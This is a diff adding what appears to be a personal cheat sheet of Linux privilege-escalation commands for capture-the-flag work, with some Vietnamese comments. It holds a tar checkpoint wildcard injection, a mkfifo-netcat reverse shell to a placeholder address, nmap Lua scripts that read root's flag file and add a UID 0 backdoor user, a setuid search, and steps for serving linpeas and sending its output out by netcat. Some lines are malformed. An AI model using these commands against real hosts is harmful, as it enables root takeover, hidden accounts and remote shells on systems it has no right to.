@@ -1,0 +1,43 @@
+https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/
+setuid binary
+doccument root
+cronjob
+
+nc -lvp 5555
+nc 172.23.255.217 5555 /etc/bash
+echo 'os.execute("cat /root/flag.txt")' > /tmp/a.lua
+
+ls -lia $(find / -perm -4000)
+nmap --script=/tmp/a.lua
+
+//check
+action
+checkpoint
+execute
+run
+script
+#liet ke nhung cai dieu hanh dang chay 
+strace tar -zcf test.tgz
+
+touch hack
+echo 'cat /root/flag.txt > /tmp/flag' > hack.sh
+tar -zcf /var/backups/uploads.tgz --checkpoint=1 --checkpoint-action=exe="sh hack"
+
+ls /usr/share/centreon/www/include/tools
+
+echo 'os.execute("sudo useradd -u 0000 sheng && echo username:123 | chpasswd ")' > /tmp/a.lua
+
+Using linPEAS.sh
+# linpeas.sh linux_ex_suggester.pl output  //3 file
+#Open link download
+Host: sudo python -m SimpleHTTPServer 80
+Victim: wget SimpleHTTPServer/linpea.sh
+#if linpeas.sh command not found: chmod +x linpeas.sh
+Victim: ./linpeas.sh >> output
+Host: nc -nlvp 4000 > output.txt
+Victim: nc Host:IP 4000 << output 
+
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your ip>
+1234 >/tmp/f" > shell.sh
+touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
+touch "/var/www/html/--checkpoint=1"
